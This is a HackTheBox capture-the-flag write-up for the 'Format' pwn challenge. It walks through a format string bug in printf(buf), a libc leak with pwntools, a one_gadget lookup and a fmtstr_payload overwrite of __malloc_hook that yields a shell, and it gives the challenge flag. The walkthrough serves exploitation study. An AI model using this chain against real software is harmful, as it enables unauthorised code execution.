---
title: "HackTheBox - Format (Format String + malloc_hook Overwrite)"
description: "Exploited a format string vulnerability to leak libc base, then overwrote __malloc_hook with a one_gadget to get a shell."
platform: "HackTheBox"
category: "Pwn"
difficulty: "Hard"
date: 2026-03-15
---

## Challenge Info

**Platform:** HackTheBox
**Category:** Pwn
**Difficulty:** Hard

## Protections

```bash
checksec format
# Arch: amd64
# RELRO: Full RELRO
# Stack: Canary found
# NX: enabled
# PIE: enabled
```

Everything is on. Full RELRO means the GOT is read-only so I can't overwrite function pointers there. The plan was to target `__malloc_hook` in libc instead, which is still writable and gets called before every `malloc()`.

## Vulnerability

The binary was passing user input straight to `printf()`:

```c
printf(buf);
```

Format string vulnerability. This gives me read and write primitives.

## Step 1: Leak libc Base

I used `%p` to walk the stack and find a libc pointer:

```python
from pwn import *

p = remote('<host>', <port>)
p.sendline(b'%15$p')
leak = int(p.recvline(), 16)
libc_base = leak - libc.symbols['__libc_start_main'] - 243
```

## Step 2: Find a one_gadget

```bash
one_gadget libc.so.6
# 0xe3afe execve("/bin/sh") constraints: rax == NULL
```

```python
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget  = libc_base + 0xe3afe
```

## Step 3: Overwrite malloc_hook

I used pwntools `fmtstr_payload` to write the one_gadget address to `__malloc_hook`:

```python
payload = fmtstr_payload(offset, {malloc_hook: one_gadget})
p.sendline(payload)
```

## Step 4: Trigger It

The next time the binary calls `malloc()`, it hits `__malloc_hook` first, which now points to the one_gadget, and a shell pops.

## Flag

```
HTB{mall0c_h00k_f0r_th3_w1n!}
```

## What I learned

- Full RELRO closes off the GOT but `__malloc_hook`, `__free_hook`, and `__realloc_hook` are still fair game
- `one_gadget` is really handy for finding shell gadgets in libc without needing a full ROP chain
- `fmtstr_payload` in pwntools does all the messy byte-splitting math for you
